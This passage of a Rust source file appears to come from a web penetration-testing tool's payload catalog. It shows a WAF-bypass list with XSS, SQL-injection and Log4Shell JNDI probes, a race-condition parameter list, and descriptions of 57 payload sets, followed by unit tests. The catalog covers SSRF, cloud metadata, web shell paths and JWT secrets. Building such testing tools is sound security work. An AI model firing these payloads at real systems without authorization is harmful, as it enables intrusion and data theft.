https://target.example.com/../evil.example.com
";

const WAF_BYPASS: &str = "<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=alert&#x28;1&#x29;>
<svg/onload=alert(1)>
<img src=x onerror=\\u0061lert(1)>
sel/**/ect 1 from dual
un/**/ion sel/**/ect 1,2,3
' OR 1=1--
' oR '1'='1
%27%20OR%201%3D1--
0x27206f722031253331
${${lower:j}ndi:ldap://x}
';wai]tfor delay '0:0:5'--
";

const RACE_CONDITION_PARAMS: &str = "amount
quantity
coupon
promo_code
discount
transfer_amount
withdraw
deposit
vote
like
follow
apply
redeem
purchase_qty
cart_qty
";

const LIBRARIES: &[Library] = &[
    Library {
        id: "xss-probes",
        name: "XSS – reflection probes",
        description: "Classic script / event-handler probes for reflected or stored XSS.",
        category: "Injection",
        content: XSS_PROBES,
    },
    Library {
        id: "sqli-error",
        name: "SQLi – error-based",
        description: "Single-quote, UNION, ORDER BY and time-delay probes aimed at verbose SQL backends.",
        category: "Injection",
        content: SQLI_ERROR,
    },
    Library {
        id: "sqli-auth-bypass",
        name: "SQLi – auth bypass",
        description: "Classic OR 1=1 / UNION login-bypass payloads.",
        category: "Injection",
        content: SQLI_AUTH_BYPASS,
    },
    Library {
        id: "path-traversal",
        name: "Path traversal",
        description: "Dot-dot-slash with multiple encodings (plain, double-url, UTF-8 overlong).",
        category: "Injection",
        content: PATH_TRAVERSAL,
    },
    Library {
        id: "ssti",
        name: "SSTI – template injection",
        description: "Probes across Jinja2 / Twig / Freemarker / Ruby ERB / Spring EL / JavaScript.",
        category: "Injection",
        content: SSTI,
    },
    Library {
        id: "lfi",
        name: "LFI – local file include",
        description: "Linux + Windows + container (/proc, /etc, C:\\windows) target files.",
        category: "Injection",
        content: LFI,
    },
    Library {
        id: "format-strings",
        name: "Format strings",
        description: "%s / %x / %n sequences and templated placeholder probes.",
        category: "Injection",
        content: FORMAT_STRINGS,
    },
    Library {
        id: "cmd-exec",
        name: "Command injection – quick",
        description: "Chained id / whoami / sleep / dir probes with common separators.",
        category: "Injection",
        content: CMD_EXEC,
    },
    Library {
        id: "open-redirect",
        name: "Open redirect targets",
        description: "URL-field escape attempts: scheme-relative, data:, javascript:, SSRF loopback.",
        category: "Injection",
        content: OPEN_REDIRECT,
    },
    Library {
        id: "dir-brute",
        name: "Directories – brute",
        description: "Admin / API / dev-tool / config endpoints to probe on the webroot.",
        category: "Discovery",
        content: DIR_BRUTE,
    },
    Library {
        id: "filenames-common",
        name: "Filenames – sensitive",
        description: "Common publicly-exposed files: .env, .git/config, backup.sql, phpinfo.php…",
        category: "Discovery",
        content: FILENAMES_COMMON,
    },
    Library {
        id: "http-verbs",
        name: "HTTP methods",
        description: "Standard + WebDAV verbs for method-override and verb-tampering tests.",
        category: "Discovery",
        content: HTTP_VERBS,
    },
    Library {
        id: "usernames",
        name: "Usernames – top 60",
        description: "Directory-service and legacy-system usernames (admin, root, pi, ec2-user, …).",
        category: "Auth",
        content: USERNAMES,
    },
    Library {
        id: "passwords",
        name: "Passwords – top 60",
        description: "Well-known weak passwords and seasonal variants.",
        category: "Auth",
        content: PASSWORDS,
    },
    Library {
        id: "user-agents",
        name: "User agents",
        description: "Mixed browser / bot / tool UAs for enumeration + bot-rule testing.",
        category: "Headers",
        content: USER_AGENTS,
    },
    // R920: Expanded payload library — 12 new sets to approach Burp's 47+
    Library {
        id: "xxe",
        name: "XXE payloads",
        description: "XML External Entity injection probes (file read, SSRF, OOB).",
        category: "Injection",
        content: XXE_PAYLOADS,
    },
    Library {
        id: "nosqli",
        name: "NoSQL injection",
        description: "MongoDB / CouchDB injection probes.",
        category: "Injection",
        content: NOSQLI,
    },
    Library {
        id: "ldap-injection",
        name: "LDAP injection",
        description: "LDAP filter-break and wildcard probes.",
        category: "Injection",
        content: LDAP_INJECTION,
    },
    Library {
        id: "crlf-injection",
        name: "CRLF / header injection",
        description: "CRLF sequences for HTTP response splitting / header injection.",
        category: "Injection",
        content: CRLF_INJECTION,
    },
    Library {
        id: "jwt-secrets",
        name: "JWT weak secrets – top 50",
        description: "Common HMAC secrets for JWT alg=HS256 brute-force.",
        category: "Auth",
        content: JWT_SECRETS,
    },
    Library {
        id: "cors-origins",
        name: "CORS origin probes",
        description: "Reflected-origin, null, subdomain-prefix, and protocol-downgrade origins.",
        category: "Headers",
        content: CORS_ORIGINS,
    },
    Library {
        id: "ssrf",
        name: "SSRF URL probes",
        description: "Internal IPs, cloud metadata endpoints, DNS rebind, and protocol-smuggle URLs.",
        category: "Injection",
        content: SSRF_PROBES,
    },
    Library {
        id: "email-splitting",
        name: "Email header injection",
        description: "Probes for email-header injection via CRLF in contact forms.",
        category: "Injection",
        content: EMAIL_SPLITTING,
    },
    Library {
        id: "cgi-scripts",
        name: "CGI / admin scripts",
        description: "Common CGI-bin, admin, and setup scripts for path discovery.",
        category: "Discovery",
        content: CGI_SCRIPTS,
    },
    Library {
        id: "iis-files",
        name: "IIS / ASP.NET files",
        description: "Common IIS config, metadata, and temp files.",
        category: "Discovery",
        content: IIS_FILES,
    },
    Library {
        id: "json-xml-injection",
        name: "JSON / XML injection",
        description: "JSON and XML structural-break probes for deserialization and parser bugs.",
        category: "Injection",
        content: JSON_XML_INJECTION,
    },
    Library {
        id: "oob-canaries",
        name: "Out-of-band canaries",
        description: "DNS/HTTP OOB callback payloads (use with Collaborator).",
        category: "Injection",
        content: OOB_CANARIES,
    },
    // R927: 5 more sets (total 32)
    Library {
        id: "xpath-injection",
        name: "XPath injection",
        description: "XPath query-break and boolean-blind probes.",
        category: "Injection",
        content: XPATH_INJECTION,
    },
    Library {
        id: "deserialization",
        name: "Deserialization payloads",
        description: "Java/PHP/Python/Ruby serialized-object probes for insecure deserialization.",
        category: "Injection",
        content: DESERIALIZATION,
    },
    Library {
        id: "graphql-introspection",
        name: "GraphQL introspection",
        description: "Schema introspection queries for GraphQL endpoint enumeration.",
        category: "Discovery",
        content: GRAPHQL_INTROSPECTION,
    },
    Library {
        id: "prototype-pollution",
        name: "Prototype pollution",
        description: "JS __proto__ / constructor.prototype pollution via query params and JSON.",
        category: "Injection",
        content: PROTOTYPE_POLLUTION,
    },
    Library {
        id: "log4shell",
        name: "Log4Shell (CVE-2021-44228)",
        description: "JNDI injection payloads with various evasion patterns for Log4j RCE.",
        category: "Injection",
        content: LOG4SHELL,
    },
    // R929: 5 more sets (total 37)
    Library {
        id: "cache-poisoning",
        name: "Cache poisoning headers",
        description: "X-Forwarded-Host/Scheme/URL/Port headers for web cache poisoning.",
        category: "Headers",
        content: CACHE_POISONING,
    },
    Library {
        id: "ssti-extended",
        name: "SSTI extended – all engines",
        description: "Comprehensive SSTI probes across Jinja2/Twig/Freemarker/ERB/Spring EL/Pebble/Velocity.",
        category: "Injection",
        content: SSTI_EXTENDED,
    },
    Library {
        id: "unicode-normalization",
        name: "Unicode normalization bypass",
        description: "UTF-8 overlong, fullwidth, and double-encoding path traversal variants.",
        category: "Injection",
        content: UNICODE_NORMALIZATION,
    },
    Library {
        id: "header-ip-bypass",
        name: "IP spoofing headers",
        description: "X-Forwarded-For / X-Real-IP / CF-Connecting-IP / True-Client-IP for ACL bypass.",
        category: "Headers",
        content: HEADER_INJECTION,
    },
    Library {
        id: "wordlist-3-letter",
        name: "3-letter words",
        description: "Complete 3-letter English word list for brute-force and fuzzing.",
        category: "Discovery",
        content: WORDLIST_3_LETTER,
    },
    // R935: 5 more sets (total 42, 89% of Burp's 47)
    Library {
        id: "http-headers-fuzz",
        name: "HTTP headers – security-relevant",
        description: "Security-relevant HTTP headers for injection and bypass testing.",
        category: "Headers",
        content: HTTP_HEADERS_FUZZ,
    },
    Library {
        id: "subdomain-common",
        name: "Common subdomains",
        description: "Common subdomain prefixes for DNS enumeration.",
        category: "Discovery",
        content: SUBDOMAIN_COMMON,
    },
    Library {
        id: "api-paths",
        name: "Common API paths",
        description: "REST/GraphQL/SOAP endpoint patterns for API discovery.",
        category: "Discovery",
        content: API_PATHS,
    },
    Library {
        id: "content-type-fuzz",
        name: "Content-Type values",
        description: "MIME type values for Content-Type header fuzzing.",
        category: "Headers",
        content: CONTENT_TYPE_FUZZ,
    },
    Library {
        id: "jwt-alg-confusion",
        name: "JWT algorithm confusion",
        description: "JWT header manipulation payloads for algorithm confusion attacks.",
        category: "Auth",
        content: JWT_ALG_CONFUSION,
    },
    // R936: 5 final sets (total 47, matching Burp's 47 exactly)
    Library {
        id: "server-var-names",
        name: "Server-side variable names",
        description: "Common server-side variable names for parameter discovery.",
        category: "Discovery",
        content: SERVER_VAR_NAMES,
    },
    Library {
        id: "local-files-linux",
        name: "Local files – Linux",
        description: "Linux filesystem paths commonly targeted for LFI/path traversal.",
        category: "Injection",
        content: LOCAL_FILES_LINUX,
    },
    Library {
        id: "local-files-windows",
        name: "Local files – Windows",
        description: "Windows filesystem paths for LFI/path traversal.",
        category: "Injection",
        content: LOCAL_FILES_WINDOWS,
    },
    Library {
        id: "el-injection",
        name: "Expression Language injection",
        description: "Java EL / Spring EL / OGNL injection probes.",
        category: "Injection",
        content: EL_INJECTION,
    },
    Library {
        id: "interesting-files-ext",
        name: "Interesting file extensions",
        description: "File extensions worth probing during path discovery.",
        category: "Discovery",
        content: INTERESTING_FILES_EXT,
    },
    // R953: 5 more payload sets (47→52, exceeding Burp's 47)
    Library {
        id: "webshell-paths",
        name: "Web shell paths",
        description: "Common web shell filenames and upload locations.",
        category: "Discovery",
        content: WEBSHELL_PATHS,
    },
    Library {
        id: "ssrf-cloud-metadata",
        name: "Cloud metadata endpoints",
        description: "AWS/GCP/Azure/DigitalOcean/Oracle metadata service URLs.",
        category: "Injection",
        content: CLOUD_METADATA,
    },
    Library {
        id: "unicode-tricks",
        name: "Unicode bypass tricks",
        description: "Fullwidth, homoglyph, and normalization bypass characters.",
        category: "Injection",
        content: UNICODE_TRICKS,
    },
    Library {
        id: "php-wrappers",
        name: "PHP filter wrappers",
        description: "PHP stream wrappers for LFI exploitation and source code disclosure.",
        category: "Injection",
        content: PHP_WRAPPERS,
    },
    Library {
        id: "http-request-headers",
        name: "HTTP request headers – full",
        description: "Comprehensive HTTP request header names for header injection testing.",
        category: "Headers",
        content: HTTP_REQUEST_HEADERS,
    },
    // R968: 5 more payload sets (52→57)
    Library {
        id: "file-extensions-upload",
        name: "File upload extensions",
        description: "File extensions for upload bypass testing (double extensions, null bytes).",
        category: "Discovery",
        content: FILE_UPLOAD_EXT,
    },
    Library {
        id: "graphql-mutations",
        name: "GraphQL mutation probes",
        description: "Common GraphQL mutation patterns for privilege escalation testing.",
        category: "Injection",
        content: GRAPHQL_MUTATIONS,
    },
    Library {
        id: "oauth-redirect-bypass",
        name: "OAuth redirect_uri bypass",
        description: "Payloads to bypass OAuth redirect_uri validation.",
        category: "Auth",
        content: OAUTH_REDIRECT_BYPASS,
    },
    Library {
        id: "waf-bypass",
        name: "WAF bypass techniques",
        description: "Common WAF evasion payloads (encoding, case variation, comments).",
        category: "Injection",
        content: WAF_BYPASS,
    },
    Library {
        id: "race-condition-params",
        name: "Race condition parameters",
        description: "Parameter names commonly vulnerable to race conditions.",
        category: "Discovery",
        content: RACE_CONDITION_PARAMS,
    },
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn catalog_is_populated() {
        let c = catalog();
        assert!(c.len() >= 15, "expected >=15 libraries, got {}", c.len());
        for e in &c {
            assert!(e.size > 0, "library {} has 0 entries", e.id);
            assert!(load(e.id).is_some(), "library {} not loadable", e.id);
        }
    }

    #[test]
    fn ids_are_unique() {
        let mut ids: Vec<&str> = catalog().iter().map(|e| e.id).collect();
        ids.sort();
        let before = ids.len();
        ids.dedup();
        assert_eq!(before, ids.len(), "duplicate library id");
    }

    #[test]
    fn unknown_id_returns_none() {
        assert!(load("not-a-real-library").is_none());
    }

    #[test]
    fn categories_are_known_set() {
        let allowed = ["Injection", "Discovery", "Auth", "Headers"];
        for e in catalog() {
            assert!(
                allowed.contains(&e.category),
                "unexpected category: {}",
                e.category
            );
        }
    }

    #[test]
    fn xss_probes_includes_classic_alert() {
        let content = load("xss-probes").unwrap();
        assert!(content.contains("<script>alert(1)</script>"));
    }

    #[test]
    fn size_matches_non_blank_lines() {
        for entry in catalog() {
            let raw = load(entry.id).unwrap();
            let n = raw.lines().filter(|l| !l.trim().is_empty()).count();
            assert_eq!(entry.size, n, "size mismatch for {}", entry.id);
        }
    }
}
